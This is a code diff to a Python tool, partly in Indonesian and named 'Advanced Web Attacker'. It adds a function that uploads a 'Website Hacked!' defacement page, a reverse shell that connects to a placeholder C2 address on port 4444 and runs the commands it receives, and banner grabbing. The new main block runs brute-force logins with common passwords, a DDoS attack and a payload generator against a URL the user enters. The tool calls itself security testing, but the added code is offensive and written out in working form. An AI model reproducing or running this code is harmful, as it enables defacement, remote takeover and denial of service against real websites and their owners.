@@ -29,6 +29,16 @@ import numpy as np
 from keras.preprocessing.sequence import pad_sequences
 from tensorflow.keras.models import load_model
 
+logo = '''
+   _____       __    ___ 
+  / ___/____ _/ /___/ (_)
+  \__ \/ __ `/ / __  / / 
+ ___/ / /_/ / / /_/ / /  
+/____/\__,_/_/\__,_/_/   
+'''
+
+print(logo)
+
 logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
 R = '\033[91m'
@@ -295,6 +305,48 @@ def check_sql_injection(target_url, session):
         else:
             print(f"{R}No SQL Injection detected at: {fuzzed_url}{N}")
 
+def banner_grabbing(target_ip):
+    banner = ''
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((target_ip, 80))
+        banner = sock.recv(1024).decode('utf-8')
+        sock.close()
+        if banner:
+            print(f"{C}Banner from {target_ip}: {banner}{N}")
+        else:
+            print(f"{R}No banner received from {target_ip}{N}")
+    except socket.error as e:
+        print(f"{R}Error connecting to {target_ip}: {e}{N}")
+
+def deface_target(url, session):
+    payload = """
+    <html>
+    <head><title>Hacked</title></head>
+    <body><h1>Website Hacked!</h1><p>This website has been compromised.</p></body>
+    </html>
+    """
+    files = {'file': ('deface.html', payload, 'text/html')}
+    response = session.post(url, files=files)
+    if response.status_code == 200:
+        print(f"{G}Website berhasil di-deface pada: {url}{N}")
+    else:
+        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")
+
+def reverse_shell():
+    server_ip = 'YOUR_C2_SERVER_IP'
+    server_port = 4444
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((server_ip, server_port))
+    while True:
+        command = sock.recv(1024).decode('utf-8')
+        if command == 'exit':
+            sock.close()
+            break
+        output = subprocess.run(command, shell=True, capture_output=True)
+        sock.send(output.stdout + output.stderr)
+
 if __name__ == "__main__":
     print(pyfiglet.figlet_format("Advanced Web Attacker"))
     print(f"{M}Welcome to the Advanced Web Application Security Testing Tool!{N}")
@@ -303,23 +355,12 @@ if __name__ == "__main__":
 
     target_url = input(f"{Y}Masukkan URL target yang ingin diuji: {N}")
     
-    print(f"{M}Starting reconnaissance and attack tests on {target_url}{N}")
+    deep_scan(target_url)
     
-    reconnaissance(target_url)
+    username_list = ['admin', 'user1', 'guest']
+    password_list = ['password123', 'admin123', 'qwerty']
+    brute_force_login(target_url, username_list, password_list)
+    ddos_attack(target_url)
+    dynamic_payload_generator(target_url, create_session())
 
-    ddos_distributed(target_url, num_threads=50)
-
-    session = create_session()
-    advanced_sql_injection(target_url, session)
-
-    multi_vector_attack(target_url, session)
-
-    deface_target(target_url, session)
-
-    exfiltrate_data(target_url, session)
-
-    adaptive_payload(target_url, ml_model)
-    
-    banner_grabbing('target-ip')
-
-    reverse_shell()
+    print(f"{M}All attacks completed on: {target_url}{N}")
